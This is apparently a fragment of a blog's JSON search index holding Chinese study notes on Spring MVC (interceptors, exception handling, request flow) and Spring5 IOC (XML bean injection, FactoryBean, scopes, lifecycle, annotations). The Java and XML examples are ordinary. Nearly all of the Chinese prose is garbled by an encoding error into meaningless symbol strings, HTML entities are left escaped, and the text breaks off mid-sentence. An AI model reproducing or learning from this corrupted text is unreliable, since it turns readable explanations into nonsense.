postHandleï¼šæ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œä¹‹åæ‰§è¡ŒpostHandle() afterComplationï¼šå¤„ç†å®Œè§†å›¾å’Œæ¨¡å‹æ•°æ®ï¼Œæ¸²æŸ“è§†å›¾å®Œæ¯•ä¹‹åæ‰§è¡ŒafterComplation() å¤šä¸ªæ‹¦æˆªå™¨ä¸€èµ·å·¥ä½œçš„æ—¶å€™ preHandleä¹‹å‰çš„é¡ºåºæŒ‰ç…§SpringMVC.xmlé‡Œé¢ç»„ä»¶æ³¨å†Œçš„å…ˆåé¡ºåºæ‰§è¡Œï¼Œå¹¶ç›¸å½“äºä»¥æ ˆçš„å½¢å¼å‹å…¥ã€‚ åé¢çš„æŒ‰ç…§å‡ºæ ˆçš„å½¢å¼æ‰§è¡Œã€‚ å¦‚æœä¸€ä¸ªæ‹¦æˆªå™¨çš„preHandleè¿”å›falseï¼Œåˆ™å…¶ä¹‹åçš„æ‹¦æˆªå™¨çš„éƒ½ä¸ä¼šæ‰§è¡Œï¼ŒpostHandle()éƒ½ä¸æ‰§è¡Œï¼Œè¿”å›falseçš„æ‹¦æˆªå™¨ä¹‹å‰çš„æ‹¦æˆªå™¨çš„afterComplation()ä¼šæ‰§è¡Œ 9 å¼‚å¸¸å¤„ç† SpringMVCæä¾›äº†è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å™¨SimpleMappingExceptionResolverï¼Œä½¿ç”¨æ–¹å¼ï¼š\nåŸºäºæ³¨è§£\n1 2 3 4 5 6 7 8 9 10 11 12 13 //@ControllerAdviceå°†å½“å‰ç±»æ ‡è¯†ä¸ºå¼‚å¸¸å¤„ç†çš„ç»„ä»¶ @ControllerAdvice public class ExceptionController { //@ExceptionHandlerç”¨äºè®¾ç½®æ‰€æ ‡è¯†æ–¹æ³•å¤„ç†çš„å¼‚å¸¸ @ExceptionHandler(ArithmeticException.class) //exè¡¨ç¤ºå½“å‰è¯·æ±‚å¤„ç†ä¸­å‡ºç°çš„å¼‚å¸¸å¯¹è±¡ public String handleArithmeticException(Exception ex, Model model){ model.addAttribute(\u0026#34;ex\u0026#34;, ex); return \u0026#34;error\u0026#34;; } } 10 SpringMVCæ‰§è¡Œæµç¨‹ ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¯·æ±‚è¢«SpringMVC å‰ç«¯æ§åˆ¶å™¨ DispatcherServletæ•è·ã€‚\nDispatcherServletå¯¹è¯·æ±‚URLè¿›è¡Œè§£æï¼Œå¾—åˆ°è¯·æ±‚èµ„æºæ ‡è¯†ç¬¦ï¼ˆURIï¼‰ï¼Œåˆ¤æ–­è¯·æ±‚URIå¯¹åº”çš„æ˜ å°„ï¼š\na) ä¸å­˜åœ¨\ni. å†åˆ¤æ–­æ˜¯å¦é…ç½®äº†mvc:default-servlet-handler ii. å¦‚æœæ²¡é…ç½®ï¼Œåˆ™æ§åˆ¶å°æŠ¥æ˜ å°„æŸ¥æ‰¾ä¸åˆ°ï¼Œå®¢æˆ·ç«¯å±•ç¤º404é”™è¯¯ iii. å¦‚æœæœ‰é…ç½®ï¼Œåˆ™è®¿é—®ç›®æ ‡èµ„æºï¼ˆä¸€èˆ¬ä¸ºé™æ€èµ„æºï¼Œå¦‚ï¼šJS,CSS,HTML)ï¼Œæ‰¾ä¸åˆ°å®¢æˆ·ç«¯ä¹Ÿä¼šå±•ç¤º404é”™è¯¯ b) å­˜åœ¨åˆ™æ‰§è¡Œä¸‹é¢çš„æµç¨‹\næ ¹æ®è¯¥URIï¼Œè°ƒç”¨HandlerMappingè·å¾—è¯¥Handleré…ç½®çš„æ‰€æœ‰ç›¸å…³çš„å¯¹è±¡ï¼ˆåŒ…æ‹¬Handlerå¯¹è±¡ä»¥åŠHandlerå¯¹è±¡å¯¹åº”çš„æ‹¦æˆªå™¨ï¼‰ï¼Œæœ€åä»¥HandlerExecutionChainæ‰§è¡Œé“¾å¯¹è±¡çš„å½¢å¼è¿”å›ã€‚\nDispatcherServlet æ ¹æ®è·å¾—çš„Handlerï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„HandlerAdapterã€‚\nå¦‚æœæˆåŠŸè·å¾—HandlerAdapterï¼Œæ­¤æ—¶å°†å¼€å§‹æ‰§è¡Œæ‹¦æˆªå™¨çš„preHandler(â€¦)æ–¹æ³•ã€æ­£å‘ã€‘\næå–Requestä¸­çš„æ¨¡å‹æ•°æ®ï¼Œå¡«å……Handlerå…¥å‚ï¼Œå¼€å§‹æ‰§è¡ŒHandlerï¼ˆController)æ–¹æ³•ï¼Œå¤„ç†è¯·æ±‚ã€‚åœ¨å¡«å……Handlerçš„å…¥å‚è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®ä½ çš„é…ç½®ï¼ŒSpringå°†å¸®ä½ åšä¸€äº›é¢å¤–çš„å·¥ä½œï¼š\na) HttpMessageConveterï¼š å°†è¯·æ±‚æ¶ˆæ¯ï¼ˆå¦‚Jsonã€xmlç­‰æ•°æ®ï¼‰è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡ï¼Œå°†å¯¹è±¡è½¬æ¢ä¸ºæŒ‡å®šçš„å“åº”ä¿¡æ¯ b) æ•°æ®è½¬æ¢ï¼šå¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œæ•°æ®è½¬æ¢ã€‚å¦‚Stringè½¬æ¢æˆIntegerã€Doubleç­‰ c) æ•°æ®æ ¼å¼åŒ–ï¼šå¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œæ•°æ®æ ¼å¼åŒ–ã€‚ å¦‚å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ ¼å¼åŒ–æ•°å­—æˆ–æ ¼å¼åŒ–æ—¥æœŸç­‰ d) æ•°æ®éªŒè¯ï¼š éªŒè¯æ•°æ®çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦ã€æ ¼å¼ç­‰ï¼‰ï¼ŒéªŒè¯ç»“æœå­˜å‚¨åˆ°BindingResultæˆ–Errorä¸­ Handleræ‰§è¡Œå®Œæˆåï¼Œå‘DispatcherServlet è¿”å›ä¸€ä¸ªModelAndViewå¯¹è±¡ã€‚\næ­¤æ—¶å°†å¼€å§‹æ‰§è¡Œæ‹¦æˆªå™¨çš„postHandle(\u0026hellip;)æ–¹æ³•ã€é€†å‘ã€‘ã€‚\næ ¹æ®è¿”å›çš„ModelAndViewï¼ˆæ­¤æ—¶ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¼‚å¸¸ï¼šå¦‚æœå­˜åœ¨å¼‚å¸¸ï¼Œåˆ™æ‰§è¡ŒHandlerExceptionResolverè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼‰é€‰æ‹©ä¸€ä¸ªé€‚åˆçš„ViewResolverè¿›è¡Œè§†å›¾è§£æï¼Œæ ¹æ®Modelå’ŒViewï¼Œæ¥æ¸²æŸ“è§†å›¾ã€‚\næ¸²æŸ“è§†å›¾å®Œæ¯•æ‰§è¡Œæ‹¦æˆªå™¨çš„afterCompletion(â€¦)æ–¹æ³•ã€é€†å‘ã€‘ã€‚\nå°†æ¸²æŸ“ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n","permalink":"http://www.reus09.top/posts/tech/spring-mvc/","summary":"Spring-mvc æœ¬ç¯‡ä¸»è¦å¯¹spring-mvcçš„çŸ¥è¯†ç‚¹è¿›è¡Œæ€»ç»“ MVCçš„å·¥ä½œæµç¨‹ï¼š ç”¨æˆ·é€šè¿‡è§†å›¾å±‚å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸­è¯·æ±‚è¢«Controlleræ¥æ”¶ï¼Œ","title":"Spring Mvc"},{"content":"Spring5 æ¡†æ¶ è¿™é‡Œä¸»è¦å­¦ä¹ äº†Spring5çš„ç›¸å…³çŸ¥è¯†ï¼Œå¯¹iocå’ŒAopçš„ç›¸å…³çŸ¥è¯†è¿›è¡Œæ•´ç† 0x01 IOC æ¦‚å¿µ æ§åˆ¶åè½¬ï¼ŒæŠŠåˆ›å»ºå¯¹è±¡è¿‡ç¨‹äº¤ç»™ Spring è¿›è¡Œç®¡ç† ä½¿ç”¨ç›®çš„ï¼š ä¸ºäº†è€¦åˆåº¦é™ä½ åº•å±‚åŸç† xml è§£æã€å·¥å‚æ¨¡å¼ã€åå°„ IOC æ€æƒ³åŸºäº IOC å®¹å™¨å®Œæˆï¼ŒIOC å®¹å™¨åº•å±‚å°±æ˜¯å¯¹è±¡å·¥å‚ 1.1 å®ç°æ–¹å¼ BeanFactoryï¼šIOC å®¹å™¨åŸºæœ¬å®ç°ï¼Œæ˜¯ Spring å†…éƒ¨çš„ä½¿ç”¨æ¥å£ï¼Œä¸æä¾›å¼€å‘äººå‘˜è¿›è¡Œä½¿ç”¨ åŠ è½½é…ç½®æ–‡ä»¶æ—¶å€™ä¸ä¼šåˆ›å»ºå¯¹è±¡ï¼Œåœ¨è·å–å¯¹è±¡ï¼ˆä½¿ç”¨ï¼‰æ‰å»åˆ›å»ºå¯¹è±¡ ApplicationContextï¼šBeanFactory æ¥å£çš„å­æ¥å£ï¼Œæä¾›æ›´å¤šæ›´å¼ºå¤§çš„åŠŸèƒ½ï¼Œä¸€èˆ¬ç”±å¼€å‘äºº å‘˜è¿›è¡Œä½¿ç”¨ åŠ è½½é…ç½®æ–‡ä»¶æ—¶å€™å°±ä¼šæŠŠåœ¨é…ç½®æ–‡ä»¶å¯¹è±¡è¿›è¡Œåˆ›å»º Beanç®¡ç† Springåˆ›å»ºå¯¹è±¡ Springæ³¨å…¥å±æ€§ å®ç°æ–¹æ³• åŸºäºxmlé…ç½®æ–‡ä»¶æ–¹å¼å®ç° åŸºäºæ³¨è§£æ–¹å¼å®ç° 1.2 xmlé…ç½®æ–‡ä»¶ 1.2.1 åˆ›å»ºå¯¹è±¡ åœ¨ spring é…ç½®æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ bean æ ‡ç­¾ï¼Œæ ‡ç­¾é‡Œé¢æ·»åŠ å¯¹åº”å±æ€§ï¼Œå°±å¯ä»¥å®ç°å¯¹è±¡åˆ›å»º åœ¨ bean æ ‡ç­¾æœ‰å¾ˆå¤šå±æ€§ï¼Œä»‹ç»å¸¸ç”¨çš„å±æ€§ * id å±æ€§:å”¯ä¸€æ ‡è¯† class å±æ€§:ç±»å…¨è·¯å¾„ï¼ˆåŒ…ç±»è·¯å¾„) åˆ›å»ºå¯¹è±¡æ—¶å€™ï¼Œé»˜è®¤ä¹Ÿæ˜¯æ‰§è¡Œæ— å‚æ•°æ„é€ æ–¹æ³•å®Œæˆå¯¹è±¡åˆ›å»º 1 \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.atguigu.spring5.User\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2 æ³¨å…¥å±æ€§ DIï¼šä¾èµ–æ³¨å…¥ï¼Œå°±æ˜¯æ³¨å…¥å±æ€§ 1.2.2.1 setæ–¹æ³•æ³¨å…¥ è¿™ä¸ªæ³¨å…¥æ–¹æ³•ç±»ä¸­å¿…é¡»è¦æœ‰setæ–¹æ³•ï¼Œä½¿ç”¨propertyå±æ€§\n1 2 3 4 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34;\u0026gt; \u0026lt;!--ä½¿ç”¨ property å®Œæˆå±æ€§æ³¨å…¥ nameï¼šç±»é‡Œé¢å±æ€§åç§° valueï¼šå‘å±æ€§æ³¨å…¥çš„å€¼ --\u0026gt; \u0026lt;property name=\u0026#34;bname\u0026#34; value=\u0026#34;æ˜“ç­‹ç»\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; è¿™ä¸ªåœ¨bookä¸­å¯¹äºç±»ä¸­çš„å…ƒç´ å¿…é¡»å®ç°äº†setBnameæ–¹æ³•\n1 2 public void setBname(String bname) { this.bname = bname; } 1.2.2.2 æœ‰å‚æ•°æ„é€ æ³¨å…¥ è¿™ä¸ªæ³¨å…¥æ–¹å¼ï¼Œæ„é€ ç±»ä¸­å¿…é¡»æœ‰å¯¹åº”çš„æ„é€ æ–¹æ³•ã€‚æ„é€ æ–¹æ³•å«æœ‰å‡ ä¸ªå‚æ•°ä¾¿åœ¨beanä¸­æ·»åŠ å‡ ä¸ªå…ƒç´ ï¼Œä½¿ç”¨constructor-argå±æ€§è¿›è¡Œé…ç½®\n1 2 3 4 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.Orders\u0026#34;\u0026gt; \u0026lt;constructor-arg name=\u0026#34;oname\u0026#34; value=\u0026#34;ç”µè„‘\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;constructor-arg name=\u0026#34;address\u0026#34; value=\u0026#34;China\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; å¯¹åº”çš„æ„é€ æ–¹æ³•ä¸º\n1 2 3 4 5 public Orders(String oname,String address) { this.oname = oname; this.address = address; } 1.2.2.3 påç§°ç©ºé—´æ³¨å…¥ éœ€è¦åœ¨beanä¸­å¯¼å…¥http://www.springframework.org/schema/pä¸­çš„å·¥å…·è¿›è¡Œçº¦æŸ\nè¿™é‡Œä»¥ä½¿ç”¨setæ–¹æ³•çš„æ³¨å…¥ä¸ºä¾‹\n1 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34; p:bname=\u0026#34;ä¹é˜³ç¥åŠŸ\u0026#34; p:bauthor=\u0026#34;æ— åæ°\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2.4 å…¶ä»–ç±»å‹å±æ€§æ³¨å…¥ å­—é¢é‡\nnullå€¼ï¼Œç”¨\u0026lt;null/\u0026gt;æ¥ä¿®é¥°å³å¯\nå±æ€§åŒ…å«ç‰¹æ®Šå€¼ï¼Œæ¯”å¦‚\u0026lt;æˆ–\u0026gt;\næ³•ä¸€ï¼šå€ŸåŠ©\u0026amp;ltï¼Œ\u0026amp;gtç­‰è½¬ä¹‰ç¬¦\næ³•äºŒï¼šä½¿ç”¨CDATA\n1 2 3 \u0026lt;property name=\u0026#34;address\u0026#34;\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;\u0026lt;å—äº¬\u0026gt;\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; æ³¨å…¥å¤–éƒ¨å±æ€§\nåœ¨ä¸€ä¸ªç±»ä¸­ï¼Œå¦ä¸€ä¸ªç±»æ³¨å…¥åˆ°è¿™ä¸ªç±»ä¸­ï¼Œå¯ä»¥å…ˆåˆ›å»ºä¸¤ä¸ªå¯¹åº”çš„å¯¹è±¡åï¼Œä½¿ç”¨refå±æ€§ï¼Œå°†ç±»æ³¨å…¥åˆ°éœ€è¦æ³¨å…¥çš„ç±»ä¸­\nå¤–éƒ¨bean\n1 2 3 4 5 6 7 \u0026lt;!--1 service å’Œ dao å¯¹è±¡åˆ›å»º--\u0026gt; \u0026lt;bean id=\u0026#34;userService\u0026#34; class=\u0026#34;com.atguigu.spring5.service.UserService\u0026#34;\u0026gt; \u0026lt;!--æ³¨å…¥ userDao å¯¹è±¡ name å±æ€§ï¼šç±»é‡Œé¢å±æ€§åç§° ref å±æ€§ï¼šåˆ›å»º userDao å¯¹è±¡ bean æ ‡ç­¾ id å€¼ --\u0026gt; \u0026lt;property name=\u0026#34;userDao\u0026#34; ref=\u0026#34;userDaoImpl\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;userDaoImpl\u0026#34; class=\u0026#34;com.atguigu.spring5.dao.UserDaoImpl\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; å†…éƒ¨beançš„æ“ä½œå°±ä¸åœ¨èµ˜è¿°ï¼Œä¸ä¸Šè¿°ç±»ä¼¼\nçº§è”èµ‹å€¼\nå³è¢«æ³¨å…¥çš„ç±»ä¸­ä¹Ÿéœ€è¦å…ƒç´ è¿›è¡Œæ³¨å…¥ å¯ä»¥ç›´æ¥ref ä¹Ÿå¯ä»¥åœ¨refåï¼Œåˆ©ç”¨class.ssåˆ¶å®šå¯¹åº”çš„ç±»ä¸­å…ƒç´ è¿›è¡Œèµ‹å€¼(è¿™é‡Œçš„sså€ŸæŒ‡å¯¹åº”çš„ç±»ä¸­å…ƒç´ ) æ³¨å…¥é›†åˆç±»å‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;!--1 é›†åˆç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;bean id=\u0026#34;stu\u0026#34; class=\u0026#34;com.atguigu.spring5.collectiontype.Stu\u0026#34;\u0026gt; \u0026lt;!--æ•°ç»„ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;courses\u0026#34;\u0026gt; \u0026lt;array\u0026gt; \u0026lt;value\u0026gt;java è¯¾ç¨‹\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;æ•°æ®åº“è¯¾ç¨‹\u0026lt;/value\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--list ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;list\u0026#34;\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;å¼ ä¸‰\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;å°ä¸‰\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--map ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;maps\u0026#34;\u0026gt; \u0026lt;map\u0026gt; \u0026lt;entry key=\u0026#34;JAVA\u0026#34; value=\u0026#34;java\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;entry key=\u0026#34;PHP\u0026#34; value=\u0026#34;php\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;/map\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--set ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;sets\u0026#34;\u0026gt; \u0026lt;set\u0026gt; \u0026lt;value\u0026gt;MySQL\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;Redis\u0026lt;/value\u0026gt; \u0026lt;/set\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; arrayå¼•å…¥arrayæ ‡ç­¾,listå¼•å…¥listï¼Œmapå¼•å…¥mapå’Œentryï¼Œsetå¼•å…¥setæ ‡ç­¾ 1.2.3 FactoryBean Spring æœ‰ä¸¤ç§ç±»å‹ beanï¼Œ\nä¸€ç§æ™®é€š bean åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ bean ç±»å‹å°±æ˜¯è¿”å›ç±»å‹ å¦å¤–ä¸€ç§å·¥å‚ beanï¼ˆFactoryBean) åœ¨é…ç½®æ–‡ä»¶å®šä¹‰ bean ç±»å‹å¯ä»¥å’Œè¿”å›ç±»å‹ä¸ä¸€æ · å®ç°æ–¹æ³•\nåˆ›å»ºç±»ï¼Œè®©è¿™ä¸ªç±»ä½œä¸ºå·¥å‚ beanï¼Œå®ç°æ¥å£ FactoryBean å®ç°æ¥å£é‡Œé¢çš„æ–¹æ³•ï¼Œåœ¨å®ç°çš„æ–¹æ³•ä¸­å®šä¹‰è¿”å›çš„ bean ç±»å‹ å€Ÿç”¨FactoryBeanæ¥å£æ¥å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface FactoryBean\u0026lt;T\u0026gt; { String OBJECT_TYPE_ATTRIBUTE = \u0026#34;factoryBeanObjectType\u0026#34;; @Nullable T getObject() throws Exception; @Nullable Class\u0026lt;?\u0026gt; getObjectType(); default boolean isSingleton() { return true; } } 1.2.4 Beanä½œç”¨åŸŸ åœ¨ Spring é‡Œé¢ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œbean æ˜¯å•å®ä¾‹å¯¹è±¡ åœ¨ spring é…ç½®æ–‡ä»¶ bean æ ‡ç­¾é‡Œé¢æœ‰å±æ€§ï¼ˆscopeï¼‰ç”¨äºè®¾ç½®å•å®ä¾‹è¿˜æ˜¯å¤šå®ä¾‹ scope å±æ€§å€¼ ç¬¬ä¸€ä¸ªå€¼ é»˜è®¤å€¼ï¼Œsingletonï¼Œè¡¨ç¤ºæ˜¯å•å®ä¾‹å¯¹è±¡ ç¬¬äºŒä¸ªå€¼ prototypeï¼Œè¡¨ç¤ºæ˜¯å¤šå®ä¾‹å¯¹è±¡ 1.2.5 ç”Ÿå‘½å‘¨æœŸ ï¼ˆ1ï¼‰é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰\nï¼ˆ2ï¼‰ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨ set æ–¹æ³•ï¼‰\nï¼ˆ3ï¼‰è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰\nï¼ˆ4ï¼‰bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰\nï¼ˆ5ï¼‰å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰\nè¿™é‡Œä»¥ä»£ç ä¸ºä¾‹\n1 2 3 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.Orders\u0026#34; init-method=\u0026#34;initMethod\u0026#34; destroy-method=\u0026#34;destroyMethod\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;oname\u0026#34; value=\u0026#34;æ‰‹æœº\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; åˆ©ç”¨init-methodï¼Œdestory-methodä¸¤ä¸ªå±æ€§æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•å’Œé”€æ¯æ–¹æ³• åŠ ä¸Šåç½®å¤„ç†å™¨ï¼Œbeanç”Ÿå‘½å‘¨æœŸå…±æœ‰ä¸ƒæ­¥\nï¼ˆ1ï¼‰é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰ ï¼ˆ2ï¼‰ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨ set æ–¹æ³•ï¼‰ ï¼ˆ3ï¼‰æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessBeforeInitialization ï¼ˆ4ï¼‰è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰ ï¼ˆ5ï¼‰æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessAfterInitialization ï¼ˆ6ï¼‰bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰ ï¼ˆ7ï¼‰å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class MyBeanPost implements BeanPostProcessor { @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;åœ¨åˆå§‹åŒ–ä¹‹å‰æ‰§è¡Œçš„æ–¹æ³•\u0026#34;); return bean; } @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;åœ¨åˆå§‹åŒ–ä¹‹åæ‰§è¡Œçš„æ–¹æ³•\u0026#34;); return bean; } } xmlé…ç½®,å…¨å±€å¼€å¯åç½®å¤„ç†å™¨\n1 \u0026lt;bean id=\u0026#34;myBeanPost\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.MyBeanPost\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.6 è‡ªåŠ¨è£…é… bean æ ‡ç­¾å±æ€§ autowireï¼Œé…ç½®è‡ªåŠ¨è£…é… autowire å±æ€§å¸¸ç”¨ä¸¤ä¸ªå€¼ï¼š byName æ ¹æ®å±æ€§åç§°æ³¨å…¥ ,æ³¨å…¥å€¼ bean çš„ id å€¼å’Œç±»å±æ€§åç§°ä¸€æ · byType æ ¹æ®å±æ€§ç±»å‹æ³¨å…¥ 1.3 åŸºäºæ³¨è§£æ–¹å¼ ï¼ˆ1ï¼‰æ³¨è§£æ˜¯ä»£ç ç‰¹æ®Šæ ‡è®°ï¼Œæ ¼å¼ï¼š@æ³¨è§£åç§°(å±æ€§åç§°=å±æ€§å€¼, å±æ€§åç§°=å±æ€§å€¼..)\nï¼ˆ2ï¼‰ä½¿ç”¨æ³¨è§£ï¼Œæ³¨è§£ä½œç”¨åœ¨ç±»ä¸Šé¢ï¼Œæ–¹æ³•ä¸Šé¢ï¼Œå±æ€§ä¸Šé¢\nï¼ˆ3ï¼‰ä½¿ç”¨æ³¨è§£ç›®çš„ï¼šç®€åŒ– xml é…ç½®\nSpring é’ˆå¯¹ Bean ç®¡ç†ä¸­åˆ›å»ºå¯¹è±¡æä¾›æ³¨è§£\n@Component:å¸¸ç”¨äºæ­£å¸¸çš„ç»„ä»¶ @Service :å¸¸ç”¨äºserviceå±‚ @Controller ï¼šå¸¸ç”¨äºcontrollerå±‚ @Repository : å¸¸ç”¨äºdaoå±‚ ä¸Šé¢å››ä¸ªæ³¨è§£åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½å¯ä»¥ç”¨æ¥åˆ›å»º bean å®ä¾‹ï¼Œåªæ˜¯ä½œç”¨çš„å±‚æ¬¡ä¸ä¸€æ · ä½¿ç”¨æ³¨è§£éœ€è¦å¼€å¯æ³¨è§£æ‰«æ\nxml\n1 \u0026lt;context:component-scan base-package=\u0026#34;com.atguigu\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; çº¯ä»£ç ,éœ€è¦åˆ›å»ºé…ç½®ç±»\n1 2 3 @Configuration //ä½œä¸ºé…ç½®ç±»ï¼Œæ›¿ä»£ xml é…ç½®æ–‡ä»¶ @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) public class SpringConfig { } åŸºäºæ³¨è§£æ–¹å¼å®ç°å±æ€§æ³¨å…¥\n@Autowiredï¼šæ ¹æ®å±æ€§ç±»å‹è¿›è¡Œè‡ªåŠ¨è£…é…\né¦–å…ˆæŒ‰ç…§ç±»å‹å»å®¹å™¨ä¸­æ‰¾å¯¹åº”çš„ç»„ä»¶ï¼Œå¦‚æœæ‰¾åˆ°ä¸€ä¸ªå°±èµ‹å€¼ï¼Œæ‰¾ä¸åˆ°å°±æŠ›å¼‚å¸¸ï¼› å¦‚æœæœ‰å¤šä¸ªç±»å‹åŒ¹é…æ—¶ï¼Œä¼šä½¿ç”¨è¦æ³¨å…¥çš„å¯¹è±¡å˜é‡åç§°ä½œä¸ºbeançš„idï¼Œåœ¨springå®¹å™¨æŸ¥æ‰¾ï¼Œæ‰¾åˆ°äº†ä¹Ÿå¯ä»¥æ³¨å…¥æˆåŠŸï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ã€‚ ç»“åˆæ³¨è§£@Qualiferï¼ŒæŒ‡å®šä¸€ä¸ªidï¼šåœ¨è‡ªåŠ¨æŒ‰ç…§ç±»å‹æ³¨å…¥çš„åŸºç¡€ä¹‹ä¸Šï¼Œå†æŒ‰ç…§æŒ‡å®šçš„beançš„idå»æŸ¥æ‰¾ã€‚å®ƒåœ¨ç»™å­—æ®µæ³¨å…¥æ—¶ä¸èƒ½ç‹¬ç«‹ä½¿ç”¨ï¼Œå¿…é¡»å’Œ@Autowiredä¸€èµ·ä½¿ç”¨ï¼›ä½†æ˜¯ç»™æ–¹æ³•å‚æ•°æ³¨å…¥æ—¶ï¼Œå¯ä»¥ç‹¬ç«‹ä½¿ç”¨ã€‚ 1 2 3 4 5 6 7 8 9 10 11 @Service public class UserService { //å®šä¹‰ dao ç±»å‹å±æ€§ //ä¸éœ€è¦æ·»åŠ  set æ–¹æ³• //æ·»åŠ æ³¨å…¥å±æ€§æ³¨è§£ @Autowired private UserDao userDao; public void add() { System.out.println(\u0026#34;service add.......\u0026#34;); userDao.add(); } } @Qualifierï¼šæ ¹æ®åç§°è¿›è¡Œæ³¨å…¥ è¿™ä¸ª@Qualifier æ³¨è§£çš„ä½¿ç”¨ï¼Œå’Œä¸Šé¢@Autowired ä¸€èµ·ä½¿ç”¨\n1 2 3 4 5 //å®šä¹‰ dao ç±»å‹å±æ€§ //ä¸éœ€è¦æ·»åŠ  set æ–¹æ³• //æ·»åŠ 